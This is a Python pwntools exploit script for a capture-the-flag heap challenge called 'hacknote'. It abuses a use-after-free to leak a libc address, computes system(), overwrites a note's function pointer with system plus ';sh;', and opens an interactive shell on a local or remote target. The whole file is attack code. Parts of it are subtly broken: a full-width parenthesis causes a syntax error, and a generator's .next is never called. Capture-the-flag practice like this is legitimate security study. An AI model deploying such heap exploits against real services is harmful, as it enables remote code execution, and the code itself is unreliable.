#!/usr/bin/env python
from pwn import *
import sys
HOST = "127.0.0.1"
PORT = 7777
debug = 1
exe = "./hacknote"

context.terminal = ["tmux","splitw","-h"]
e = ELF(exe)
arena_off = 0x1b2780
if debug:
    context.log_level = "debug"
if len(sys.argv) > 1:
    p  = remote(sys.argv[1],int(sys.argv[2]))
    libc  = ELF("./libc-2.23.so")
else:
    libc  = ELF("/lib/i386-linux-gnu/libc.so.6")
    p = process([exe])
def sl(st):
    p.sendline(st)
def ru(st):
    return p.recvuntil(st)
def sd(st):
    p.send(st)
def new(size,content):
    ru("choice")
    sl("1")
    ru（"size")
    sl(str(size))
    ru(":")
    sl(str(content))
def delete(index):
    ru("choice")
    sl("2")
    ru(":")
    sl(str(index))

def pr(index):
    ru(":")
    sl("3")
    ru(":")
    sl(str(index))

#gdb.attach(p)
new(0x100,"aaaa") # idx  0
new(8,"aaa")      #idx 1
new(0x100,"aaaa") #idx 2

delete(0)
pause()
new(0x100,'bbb')#idx 3
pr(0)


libc_base = u32(ru("\x7f")[-4:])-48-arena_off
print hex(libc_base)

system = libc.symbols["system"] + libc_base
bin_sh = libc.search("/bin/sh").next + libc_base

delete(1)
delete(3)

new(8,p32(system)+";sh;") # idx 4
pause()
pr(1)
p.interactive()



